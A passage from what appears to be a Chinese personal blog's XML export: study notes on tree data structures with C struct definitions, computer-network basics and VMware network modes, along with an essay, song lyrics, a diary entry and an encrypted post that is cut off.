    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="树型结构"><a href="#树型结构" class="headerlink" title="树型结构"></a>树型结构</h1><h2 id="1-1-概念"><a href="#1-1-概念" class="headerlink" title="1.1 概念"></a>1.1 概念</h2><p>树：n &gt;= 0  个结点的有限集合，一棵树是由根和它的子树构成，子树又由子树的根和更小的子树构成。</p>
<p>空树：n = 0</p>
<p>森林：一棵树中每个结点的子树多构成的集合，即在森林中的每棵树加上一个共同的根，森林就成为了一颗树。</p>
<hr>
<p>上端结点、下端结点</p>
<p>双亲（父母、前件）</p>
<p>子女（孩子、后件）</p>
<p>兄弟</p>
<p>祖先</p>
<p>子孙</p>
<hr>
<p>某结点的度：该结点所拥有的子女数</p>
<p>树的度：树中所有结点度的最大值</p>
<p>树枝：树中连接两个结点的线段</p>
<p>树的深度（高度）：树的层次数</p>
<hr>
<p>终端结点（叶子结点）：度为 0 的结点</p>
<p>非终端结点（分支结点）：度不为 0 的结点</p>
<p>路径：从某结点开始沿着自上而下的顺序到达另一个结点，称该路径</p>
<p>路径的长度：是所经过的树枝的条数</p>
<p>树形结构的表示方法：括号表示法、嵌套集合表示法、凹入表示法</p>
<p><img src="https://i.loli.net/2021/10/30/Jl2scUvpjQnIqAu.png" alt="image-20211030152824457"></p>
<p><img src="https://i.loli.net/2021/10/30/cdGO7smFBlHT1k4.png" alt="image-20211030152839890"></p>
<p><img src="https://i.loli.net/2021/10/30/g9nOytLS2KNFMhT.png" alt="image-20211030152926106"></p>
<p><img src="https://i.loli.net/2021/10/30/lPRDXKLTpjYtf9s.png" alt="image-20211030152853872"></p>
<hr>
<p>有序树</p>
<p>无序树</p>
<p>例：下面的树，若看成是有序树则不相等；若肯成是无序树，则可看作是相等的。</p>
<p><img src="https://i.loli.net/2021/10/30/myhJ65nSTzoePEK.png" alt="image-20211030152648707"></p>
<h2 id="1-2-树的存储结构"><a href="#1-2-树的存储结构" class="headerlink" title="1.2 树的存储结构"></a>1.2 树的存储结构</h2><h3 id="1-2-1-双亲表示法-—–-一维数组"><a href="#1-2-1-双亲表示法-—–-一维数组" class="headerlink" title="1.2.1 双亲表示法 —– 一维数组"></a>1.2.1 双亲表示法 —– 一维数组</h3><p>data  parent</p>
<p>根结点 双亲 值 定义为 -1，root 位置定为 0</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAXSIZE 100</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">char</span> datatype;   <span class="comment">//根据树中结点的具体类型进行定义，这里我们假设是字符型</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">node</span>&#123;</span></span><br><span class="line">    datatype data;	<span class="comment">//结点的类型</span></span><br><span class="line">    <span class="keyword">int</span> parent;		<span class="comment">//结点双亲的下表</span></span><br><span class="line">&#125;node;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tree</span>&#123;</span></span><br><span class="line">    node treelist[MAXSIZE];	<span class="comment">//存放结点的数组</span></span><br><span class="line">    <span class="keyword">int</span> length,root;   <span class="comment">//树中实际所含结点的个数  根结点的位置</span></span><br><span class="line">&#125;tree;</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/10/30/oeaRhzFCUY5O8ws.png" alt="image-20211030154321554"></p>
<h3 id="1-2-2-孩子表示法-—–-三种"><a href="#1-2-2-孩子表示法-—–-三种" class="headerlink" title="1.2.2 孩子表示法 —– 三种"></a>1.2.2 孩子表示法 —– 三种</h3><p><strong>指针方式 孩子表示法</strong> —- <strong>指针数组</strong></p>
<p>每个结点：两个域</p>
<p>值域：data </p>
<p>指针数组（每个元素是一个指向该结点子女的指针）：child[m]</p>
<p>度为m的树，其指针数组的大小即是 m</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> m 3  <span class="comment">//树的度数</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">char</span> datatype;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">node</span>&#123;</span></span><br><span class="line">    datatype data;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">child</span>[<span class="title">m</span>];</span> <span class="comment">//指向子女的指针数组</span></span><br><span class="line">&#125;node,*tree;</span><br><span class="line"></span><br><span class="line">tree root;		<span class="comment">//指向树根结点的指针</span></span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/10/30/SeQ3faz8ACvqj2R.png" alt="image-20211030154722206"></p>
<p><strong>数组方式 孩子表示法</strong> —- <strong>一维数组</strong></p>
<p>每个结点：域个数不定</p>
<p>值域：data</p>
<p>一维数组：child[m]</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> m 3</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAXSIZE 20</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">char</span> datatype;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">node</span>&#123;</span></span><br><span class="line">    datatype data;</span><br><span class="line">    <span class="keyword">int</span> child[m];</span><br><span class="line">&#125;treenode;</span><br><span class="line"></span><br><span class="line">treenode tree[MAXSIZE]; <span class="comment">//存储树结点的数组</span></span><br><span class="line"><span class="keyword">int</span> root;  <span class="comment">//根结点 下标</span></span><br><span class="line"><span class="keyword">int</span> length; <span class="comment">//树中实际所含结点个数</span></span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/10/30/pBfqKovTHn976gs.png" alt="image-20211030155400513"></p>
<blockquote>
<p><strong>指针方式和数组方式孩子表示法缺点：</strong></p>
<p>每个结点所含子女个数不知道，不相同，则 child 数组的大小仅仅由 树的度决定，则会造成 空间的闲置与浪费。</p>
<p><strong>解决：链表方式孩子表示法</strong></p>
</blockquote>
<p><strong>链表方式 孩子表示法</strong></p>
<p>每个结点：两个域</p>
<p>值域：data</p>
<p>指针域（指向该结点的第一个子女）</p>
<p>每个结点子女 又 排列起来形成一个单链表，n 个结点 n 个单链表</p>
<p>再使用数组存储单链表的头指针</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAXSIZE 50</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">char</span> datatype;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">chnode</span>&#123;</span>  <span class="comment">//孩子结点类型：单链表</span></span><br><span class="line">    <span class="keyword">int</span> child;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">chnode</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;chnode,*chpoint;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span>    <span class="comment">//树中每个结点类型</span></span><br><span class="line">    datatype data;</span><br><span class="line">    chpoint firstchild;	<span class="comment">//指向第一个子女结点的指针</span></span><br><span class="line">&#125;node;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span>		<span class="comment">//树的类型</span></span><br><span class="line">    node treelist[MAXSIZE];</span><br><span class="line">    <span class="keyword">int</span> length,root;  <span class="comment">//树中实际所含结点个数、根结点的位置</span></span><br><span class="line">&#125;tree;</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/10/30/CgNt4ZrSkA6UiKM.png" alt="image-20211030160016424"></p>
<blockquote>
<p><strong>链表方式孩子表示法</strong> 虽然可以建立动态的链表，但是又要额外需要空间来存放一个指向下一个子女的指针 next，<strong>又增加了空间的开销</strong>。</p>
</blockquote>
<p>应根据实际情况进行存储方式的选择。</p>
<h3 id="1-2-3-孩子兄弟表示法-（二叉树表示法）"><a href="#1-2-3-孩子兄弟表示法-（二叉树表示法）" class="headerlink" title="1.2.3 孩子兄弟表示法 （二叉树表示法）"></a>1.2.3 孩子兄弟表示法 （二叉树表示法）</h3><p>每个结点：三个域     </p>
<p>值域：data</p>
<p>两个指针域：firstchild  rightchild (分别指向该结点的第一个子女和其右兄弟)  </p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">char</span> datatype;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">node</span>&#123;</span>  <span class="comment">//树的结点类型</span></span><br><span class="line">    datatype data;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">firstchild</span>,*<span class="title">rightsibling</span>;</span>  <span class="comment">//第一个子女、右兄弟</span></span><br><span class="line">&#125;node,*pnode;</span><br><span class="line"></span><br><span class="line">pnode root; <span class="comment">//指向树根结点的指针</span></span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/10/30/VIs7XdeYLw5HTfx.png" alt="image-20211030161221026"></p>
<h2 id="1-3-树的遍历"><a href="#1-3-树的遍历" class="headerlink" title="1.3 树的遍历"></a>1.3 树的遍历</h2><p>按照某种规定的顺序访问树中每一个结点，且每个结点仅仅只能访问一次</p>
<h3 id="1-3-1-前序遍历-—-根-gt-左-gt-右"><a href="#1-3-1-前序遍历-—-根-gt-左-gt-右" class="headerlink" title="1.3.1 前序遍历 —- 根-&gt;左-&gt;右"></a>1.3.1 前序遍历 —- <code>根-&gt;左-&gt;右</code></h3><h3 id="1-3-2-后序遍历-—-左-gt-右-gt-根"><a href="#1-3-2-后序遍历-—-左-gt-右-gt-根" class="headerlink" title="1.3.2 后序遍历 —- 左-&gt;右-&gt;根"></a>1.3.2 后序遍历 —- <code>左-&gt;右-&gt;根</code></h3><h3 id="1-3-3-层次遍历-—-上至下，左至右"><a href="#1-3-3-层次遍历-—-上至下，左至右" class="headerlink" title="1.3.3 层次遍历 —- 上至下，左至右"></a>1.3.3 层次遍历 —- <code>上至下，左至右</code></h3><p><img src="https://i.loli.net/2021/10/30/52LIEUyk7gorXsZ.png" alt="image-20211030162231970"></p>
]]></content>
      <categories>
        <category>数据结构</category>
      </categories>
  </entry>
  <entry>
    <title>胡适与江冬秀</title>
    <url>/2021/10/01/%E8%83%A1%E9%80%82%E4%B8%8E%E6%B1%9F%E5%86%AC%E7%A7%80/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>她并非小肚鸡肠，她能容忍胡适的风花雪月，但她就是不愿意原谅，曾经那么信任的两个人，嘴</p>
<p>上说着表哥表妹，背地里却狠狠背叛了她。</p>
<p>张爱玲说：”他们（胡适和江冬秀）是旧式婚姻罕有的幸福例子。”</p>
<p>她看多了旧式婚姻之中女人的悲剧，她绝对不能做怨妇，不能被丈夫牵着鼻子走，而是让胡适在</p>
<p>生活中依赖她，在心中敬重她，在感情上不能轻易放弃她。</p>
<p>胡适和江冬秀弯弯绕绕，终于走向白头功德圆满，他从刚开始的衡量算计，委屈求全，到真正为</p>
<p>江冬秀折服。世人笑他一位西装客娶了小脚女，哪知在江冬秀的人生哲理前，胡适的那些小聪明</p>
<p>真的就不算什么事儿了。</p>
<p>思君不见，倍感思君；别离难忍，忍痛别离。</p>
]]></content>
      <categories>
        <category>生活杂谈</category>
      </categories>
  </entry>
  <entry>
    <title>计算机网络概念、发展、性能</title>
    <url>/2021/10/07/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%A6%82%E5%BF%B5%E3%80%81%E5%8F%91%E5%B1%95%E3%80%81%E6%80%A7%E8%83%BD/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><img src="https://i.loli.net/2021/09/29/8YW4KU7igu1OhPz.png" alt="image-20210929191834740"></p>
<p><img src="https://i.loli.net/2021/09/29/QhLMIUy9F2NGsKm.png" alt="image-20210929191855181"></p>
<h2 id="1-1-计算机网络在信息时代的作用"><a href="#1-1-计算机网络在信息时代的作用" class="headerlink" title="1.1 计算机网络在信息时代的作用"></a>1.1 计算机网络在信息时代的作用</h2><p>21世纪，数字化、网络化、信息化</p>
<p>网络化：三网——-电信网络、计算机网络、有线电视网络</p>
<p>计算机网络：因特网、其它网络（政府专用网络等等）</p>
<p><strong>计算机网络的重要功能：</strong></p>
<ul>
<li><p>连通性：彼此连接，交换信息</p>
</li>
<li><p>共享：信息共享、软硬件共享</p>
</li>
</ul>
<h2 id="1-2-因特网"><a href="#1-2-因特网" class="headerlink" title="1.2 因特网"></a>1.2 因特网</h2><p>网络：Network 结点（交换机 和 计算机） 与 链路 连接，许多计算机 通过 链路 连接在交换机上，之间的—— 交换机</p>
<p>互连网：internet  （Network of Networks） 连接  各个网络，网络与网络 通过路由器 相连 ——- 路由器</p>
<p>因特网：Internet   全球最大的互连网  TCP/IP</p>
<p><strong>因特网发展三个阶段：</strong></p>
<ul>
<li><p>ARPANET 向互连网 发展：</p>
<ul>
<li>1969 年，分组交换</li>
<li>1975 年，互联网</li>
<li>1983 年，因特网 TCP/IP，此时 是未开放的政府性质的网络</li>
</ul>
</li>
<li><p>三级结构的因特网</p>
<ul>
<li>1985 年，三个地区网（校园网等），一个主干网，地区网连接在主干网上</li>
</ul>
</li>
<li><p> 多层次 ISP 结构的因特网  （ISP  因特网服务提供商：端系统通过其连接在因特网）</p>
</li>
</ul>
<p>  由因特网管理机构 分配公网 IP 给 ISP ，然后 ISP 再分配给 端系统，同时 ISP 也是分级的 </p>
<p>  <img src="https://i.loli.net/2021/09/29/FdNSmQTnuh7VrR3.png" alt="image-20210929194601798"></p>
<p>选择本地运营商下载速度快</p>
<p><img src="https://i.loli.net/2021/09/29/HTCXe7l9iFucVGk.png" alt="image-20210929194930259"></p>
<p><img src="https://i.loli.net/2021/09/29/LZSN1lkznXMOhiE.png" alt="image-20210929195123493"></p>
<p><img src="https://i.loli.net/2021/09/29/ywlZ1kLFCsxuTmV.png" alt="image-20210929195256507"></p>
<h2 id="1-3-因特网的组成"><a href="#1-3-因特网的组成" class="headerlink" title="1.3 因特网的组成"></a>1.3 因特网的组成</h2><h3 id="1-3-1-核心部分"><a href="#1-3-1-核心部分" class="headerlink" title="1.3.1 核心部分"></a>1.3.1 核心部分</h3><p><strong>数据交换方式：</strong></p>
<ul>
<li><p><strong>电路交换 Circuit Switching</strong> ：面向连接</p>
<p>举例：打电话</p>
<ol>
<li>建立连接：申请占用通信资源（耗时）</li>
<li>通话过程：一直占用资源</li>
<li>释放连接：释放通信资源（不释放即为 占线）</li>
</ol>
<p>适用于：数据量很大的实时性传输；核心路由器之间可使用。</p>
</li>
<li><p><strong>报文交换 Message Switching</strong></p>
<p>报文比分组长（不分段）</p>
<p>报文交换的时间长</p>
<p>不建立连接</p>
</li>
<li><p><strong>分组交换 Packet Switching</strong>：计算机网络采用该方式实现数据通信</p>
<ol>
<li><p>发送端将需要传输的数据进行分组：每一个分组均由 首部（源地址、目标地址） 和 数据 两部分组成 </p>
</li>
<li><p>接收端 接收每个分组，去掉其首部保留数据，连接在一起，使数据完整</p>
</li>
<li><p>从发送端到接收端：进行分组的转发——由路由器进行选择最佳合适的路径进行转发    </p>
</li>
</ol>
<p>（路由器：存储、转发的功能    暂存、查找转发表、找到要转发的端口）</p>
<p>不需要建立连接，不占线 </p>
<p>优点：高效、迅速、可靠、灵活</p>
<p>缺点：时延、开销</p>
</li>
</ul>
<p><img src="https://i.loli.net/2021/09/29/nscfoZhNGtvegAX.png" alt="image-20210929201927140"></p>
<p><strong>耗时：报文 &gt; 电路 &gt; 分组</strong></p>
<h3 id="1-3-2-边缘部分"><a href="#1-3-2-边缘部分" class="headerlink" title="1.3.2 边缘部分"></a>1.3.2 边缘部分</h3><p><strong>主机之间的通信方式：</strong></p>
<ul>
<li><p><strong>C/S 客户服务器方式：Client/Server</strong></p>
<p>服务器是服务器，客户机是客户机</p>
</li>
<li><p><strong>P2P 对等方式：Peer-to-Peer</strong></p>
<p>客户机也可以是服务器，即是服务器也是客户机</p>
<p>例如：P2P 下载：可以从多个源上下载同一个文件，不需要仅仅从一个服务器上下载</p>
</li>
</ul>
<h2 id="1-4-计算机网络在我国的发展"><a href="#1-4-计算机网络在我国的发展" class="headerlink" title="1.4 计算机网络在我国的发展"></a>1.4 计算机网络在我国的发展</h2><p>1994 年 4 月 20 日，中国正式接入互连网</p>
<h2 id="1-5-计算机网络的类别"><a href="#1-5-计算机网络的类别" class="headerlink" title="1.5 计算机网络的类别"></a>1.5 计算机网络的类别</h2><p><img src="https://i.loli.net/2021/09/29/rn4oItQE9judziC.png" alt="image-20210929203028386"></p>
<p><img src="https://i.loli.net/2021/09/29/9VM6m7hXntDLwfl.png" alt="image-20210929202956297"></p>
<h2 id="1-6-计算机网络的性能"><a href="#1-6-计算机网络的性能" class="headerlink" title="1.6 计算机网络的性能"></a>1.6 计算机网络的性能</h2><p>速率：连接在计算机网络上的主机在数字信道上传送 <strong>数据位数</strong> 的速率  data rate   bit rate</p>
<p>b/s   kb/s   Mb/s   Gb/s</p>
<p>带宽：数据通信领域中，数字信道所能传送的最高数据率</p>
<p>b/s  kb/s  Mb/s  Gb/s</p>
<p>吞吐量：单位时间内通过某个网络（所有路径）的数据量</p>
<p>b/s  Mb/s</p>
<p>时延：发送时延、传播时延、处理时延、排队时延之和 </p>
<p>时延带宽积：传播时延 x 带宽 </p>
<p>往返时间：从发送端发送数据开始，到发送端收到接收端确认 为止   </p>
<p>利用率</p>
<ul>
<li>信道利用率：有数据通过时间/（有加无）数据通过的时间</li>
<li>网络利用率：信道利用率加权平均值</li>
</ul>
<p><img src="https://i.loli.net/2021/09/29/IvD1ObgQ6At9JTC.png" alt="image-20210929212908347"></p>
<p><strong>非性能指标：</strong></p>
<p>费用 、管理与维护、质量、标准化、可靠性、可扩展性、可升级性</p>
]]></content>
      <categories>
        <category>计网</category>
      </categories>
      <tags>
        <tag>计网</tag>
      </tags>
  </entry>
  <entry>
    <title>虚拟机的网络设置</title>
    <url>/2021/10/08/%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%9A%84%E7%BD%91%E7%BB%9C%E8%AE%BE%E7%BD%AE/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="虚拟机的网络设置"><a href="#虚拟机的网络设置" class="headerlink" title="虚拟机的网络设置"></a>虚拟机的网络设置</h1><p>VMware三种网络设置：Bridged桥接，NET网络地址转换模式，Host-Only仅主机模式</p>
<p>当下载软件之后，我们的真实机上将会多出一些虚拟网卡，用于 虚拟机网络的配置</p>
<p><img src="https://i.loli.net/2021/10/08/RIh78Fy2A4GpOVr.png" alt="image-20211008210437678"></p>
<blockquote>
<ul>
<li><strong>VMnet0</strong> ：用于 Bridged 桥接模式</li>
<li><strong>VMnet8</strong> ：用于 NET 模式</li>
<li><strong>VMnet1</strong> ：用于 Host-Only 模式</li>
</ul>
</blockquote>
<p><img src="https://i.loli.net/2021/10/08/NnEDgAUpr5cLC4f.png" alt="image-20211008201312486"></p>
<ul>
<li><p>可以看到存在 三个 VMnet0   VMnet1  VMnet8</p>
</li>
<li><p>这些是 VMware Workstation 软件 自带的，可以进行设置，可以进行删除，它们相当于 是三个交换机。</p>
</li>
<li><p><strong>VMnet0</strong> ：如果将一个虚拟机设置为连接在 该交换机上，则相当于 将其 当作一个 真实的物理机 一样连接在你 真实机的所处的网段 当中。</p>
</li>
</ul>
<blockquote>
<p><strong>测试：设置 Windows 7 接在 VMnet0 上</strong></p>
</blockquote>
<p><img src="https://i.loli.net/2021/10/08/3U4jLEX6GvbKNgr.png" alt="image-20211008201924965"></p>
<p>我们设置为 自动获得 IP 地址，然后查看其网络连接的详细信息，可以看到与我们真实的物理机所处的网段相同。</p>
<p><img src="https://i.loli.net/2021/10/08/zReG8n63lvoM7Ni.png" alt="image-20211008202237411"></p>
<blockquote>
<p>使用 真实机 ping 192.168.4.234</p>
<p>实际上，只要是处于该网段中的任意一台计算机都可以 ping 通 我们所设置的 虚拟机</p>
</blockquote>
<p>当中可能出现的错误：解决办法 （注意：需要使用 管理员方式运行；关闭要ping 的主机的防火墙）</p>
<p><img src="https://i.loli.net/2021/10/08/vJOUVGj97s4ip6F.png" alt="image-20211008203642130"></p>
<p><img src="https://i.loli.net/2021/10/08/3unJasAW6EZprLj.png" alt="image-20211008204622495"></p>
<ul>
<li>当不需要与外网进行通信，也就是平时我们 仅仅搭建一个小型局域网的 测试，只需要我们的几个虚拟机之间进行通信，我们就不用使用 VMnet0 ，可以使用 其他的交换机或者是 使用 Host-Only</li>
<li>**NET **：通过真实机 上网，存在一个地址转换，只要是真实机所能访问的所有网络，虚拟机均可</li>
<li><strong>Host-Only</strong> ：仅主句模式，仅仅能与 真实机 进行通信</li>
</ul>
<blockquote>
<p><strong>补充：</strong></p>
<p><strong>169.254.X.X</strong></p>
<p>是Windows操作系统在DHCP信息租用失败时自动给客户机分配的IP地址。但是是无法与网关通信的，也无法接入Internet的情况。</p>
</blockquote>
<p><a href="https://www.cnblogs.com/cnjavahome/p/11266931.html">虚拟机网络设置 参考</a></p>
]]></content>
      <categories>
        <category>计网</category>
      </categories>
      <tags>
        <tag>虚拟机</tag>
      </tags>
  </entry>
  <entry>
    <title>那一年</title>
    <url>/2021/10/26/%E9%82%A3%E4%B8%80%E5%B9%B4/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>​        那一年放肆的自由</p>
<p>　　就这样牵起你的手</p>
<p>　　不懂什么温柔不顾你的感受</p>
<p>　　寂寞总把我冲昏头</p>
<p>　　是你体谅我的任性要求</p>
<p>　　在别人都放弃了我以后</p>
<p>　　沉默的心为你再次悸动</p>
<p>　　浩瀚宇宙美不胜收</p>
<p>　　只是我不配再把你拥有</p>
<p>　　当你独自面对回忆汹涌</p>
<p>　　那一年雪都下的很沉重</p>
<p>　　不敢回头明知你泪在流</p>
<p>　　泛黄的日记写永久</p>
<p>　　讽刺我现在才会懂</p>
<p>　　怀念你的温柔还有什么感受</p>
<p>　　寂寞让我习惯了痛</p>
<p>　　是你体谅我的任性要求</p>
<p>　　在别人都放弃了我以后</p>
<p>　　沉默的心为你再次悸动</p>
<p>　　浩瀚宇宙美不胜收</p>
<p>　　只是我不配再把你拥有</p>
<p>　　当你独自面对回忆汹涌</p>
<p>　　那一年雪都下的很沉重</p>
<p>　　不敢回头明知你泪在流</p>
<p>　　我们爱到尽头谁都不肯放手</p>
<p>　　不如坏人就由我担当承受</p>
<p>　　不管你懂不懂我成全的疼痛</p>
<p>　　是你体谅我的任性要求</p>
<p>　　在别人都放弃了我以后</p>
<p>　　沉默的心为你再次悸动</p>
<p>　　浩瀚宇宙美不胜收</p>
<p>　　只是我不配把你拥有</p>
<p>　　当你独自面对回忆汹涌</p>
<p>　　那一年雪都下的很沉重</p>
<p>　　不敢回头明知你泪在流</p>
]]></content>
      <categories>
        <category>音乐分享</category>
      </categories>
  </entry>
  <entry>
    <title>难熬的一夜</title>
    <url>/2021/10/01/%E9%9A%BE%E7%86%AC%E7%9A%84%E4%B8%80%E5%A4%9C/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>难以想象，现在是8月27日5：56，我现在正躺在床上，写着这篇感想。</p>
<p>这个时间，对于我来说，怎么可能，不在睡觉，可事实是，什么鬼，我简直不敢相信，我入戏就</p>
<p>这么深吗，从前根本没有这样过，整整一个晚上，我满脑子都是剧情，可怕的剧情。夜里，好多</p>
<p>次清醒着，却又不敢睁眼，生怕一睁眼，就会有那张脸出现在我的眼前。要么就是满脑子的男主</p>
<p>女主，我对男主的经历感到很难过，并不是他的错啊，他也很痛苦啊，可是为什么要让他来承受</p>
<p>这一切。哎，总之，我很伤心，更为之心痛。</p>
<p>天色渐渐明朗，我听见了下面阿姨的扫地声，突然就不觉着害怕了，因为，这个世界很美好的不</p>
<p>是吗？你自己不也说过，这个世界，远比你想象的更加美好！太阳总会升起，世界总会迎来光</p>
<p>明。</p>
<p>就当是在给自己壮胆吧，世界的黑暗也总得有人知道，它在帮助我们变得更加勇敢。</p>
<p>2021.8.27    6：12</p>
]]></content>
      <categories>
        <category>生活杂谈</category>
      </categories>
  </entry>
  <entry>
    <title>雨天心事</title>
    <url>/2021/10/09/%E9%9B%A8%E5%A4%A9%E5%BF%83%E4%BA%8B/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="94ca14958087636ac0d05246e2f08cdc77fbac705e80a44b4b290d7e348a4393">e91be0fd6c8a9227b7bcbe4e5e48d315c06aa4dc378147e1803de676640ec653b48c636617909faef5c22569585e67f2624f943dbd04bc3a4bc1e889c96c1c44fe86cf8189cc7f38066de20ed3e09ee470446ca383e292a288f38c1ff5a6edeaf4522c2592050d45424806119cfb091fff3cbf4949ac22db198b289b6718d25fd5258f1ac1fe9c84ef42543328f72721346d1f720eaba9fc244eba04c8158a640746cb6d2adf765058859136d535a857c9fd4a6bf6c4586394fda58cb6da01920d51f442b2b14d924759f4e4cd4079a0e838844ff4e3d58efd94fa90ce4278c3c924518f7802a60c16990c8977390c1238303a31f9328b73dc4ccae66a1c01a8bad2339e90bc4e00a3078f567cceac7ccea98820aece5f9ec96983a258624a5f5be0ac312748d1794e5d0849439130e5dd3c59665522e84a71bfd23c75bf056e21e2569a055563db1688fcca74f84234a845c119485dfd1d8d1edc96a39ed01c7a62cf262c6478bcb26f7e1cb279673b2bc978c68f035cdb801c095dc71bb0a1b7b800d648f8744394e428bff9c5042c611a83a5e2c0032258d4a8364ca987a0ed987df761031bb902a20d1b177273b561745ad3a171c4c2b5b6d9d47f2e258e653adc2ea9c73aeb1d907931a2e908289f80eb9202dac06035ba030297970f3235467707bf4485da5dd63ead56b4ed76b62d8c566ce726df1e1d1b32f12ec2313193c89bf97252f85e62fcd5cd447772503afcdf0ec62b9edf620d6c1de3bbd9ed66924c2856866cd7bb8ca4b1ca2da9db20f55c652b0aa28f4abd3c10316c9fbd60d0492370b873dda7f4213b05b015802af576956b13c13dc0f3c2bc420ef4656ad6e5003f24c6c562a54d3edd9e21cb49b6bce46f8c39200f2e268fae8aabaec974beeb47eb2b60b57966f327ba54bc492617000f7b2601fa422534022c39437d7495f39ce645ff2e7408359b9cca0777508adf4984c92f0ac6c68722abf6df8ae58d3358efc20c71d42a1a49d1458f6e2791ffae2dd1fdad1099fa60c2659e235224b9a5328a88e1d028171398d07a81e3dd51a63bc9bc25d488a6cedf0c10465354928eb1444d3eb0e5738a4602e5c624649f04e94bae613052604916bd2a3cb04ec418314ee55962cf5e27fbe27d526cb96324e2e40a18967c596e83cda0bdc562ed9259aaec04379fd1218cc92ca702205b7516de1b094f71e3b9f6254b664a83a8936829d1034a3896f69683138c3a09816cb41b259686f18042f7f2deb0ee9db058697a2765b3f0175c01499c715972db584137319bbeda1579d123f6ae7944cae638a103677458833b7c559fc608bc6d282e66f16c54f98fe79f6c9de7b0ab33aaa0d680b1904e6b1fc801e12b471aab330a1686c4c0c312bd6c68699c9ee6172ffc34a2646aea9b508791b1ba10c2113f30d074908e87382f5d78f1690fdd1eeb2179724542adffd134d6fc3c2cb77a13caa5172b68e56aef84ed004ea57ea42273513b40844462eb67b6a5024b19bac140bdf467d8f736cb1b2bc5694972b57c8e84daf515ffaf0504d739a482c29fa5d302ed9669d09d10d23dc9a28b63abf17ae2a55438f43e53b7d532819cbaa1af4541ce6bd47c07e1d59a17f5f4ac1379a64801ae38353722aedceafcad0c189886be14130c40cee0a9c4bee04386a7e23d97fe3c08b7c44c08fa8afb06c00a102338dfb22439fac82a95ea2eba137676f11f7ce604f2e6eec63f6de01a5c209935a835c72ac76294448261b37111997e4ed1e6d4047ca3801608d9ee222af4a3dd68c3bd21ca3d6f47738f78b99f407b008901d91ea716b360502d1661055fceb90f8012f11ed98fd97fbfc748b1e190c58233a9d36d2a0f50bc44151899d39cea909f815c2c9d45ffcb17481822672828839bd91b52f3884def95db15ec53b69bb64985278c7471ab8565c928679cd72fbe08b2634836ff2f612f1ac891d04a43986232d844df4898945b30e7d1522f52ddef4c7c54fe45571fb8968bc6aabdc60787a50c4fff2ac0d165a2748d195a2c4fb60fd60c7dd1975079f11d6f8ffa5d5e00e5ab31fb513fd98f2c1e85631757a5416883c65883347ebb6bce8fdcaac9c9382bec2c36f954043b2a988255ba090bd93d75aeba437785d527b14463abb060f7661f7551aaf13ad821a8dcb34afa4c6a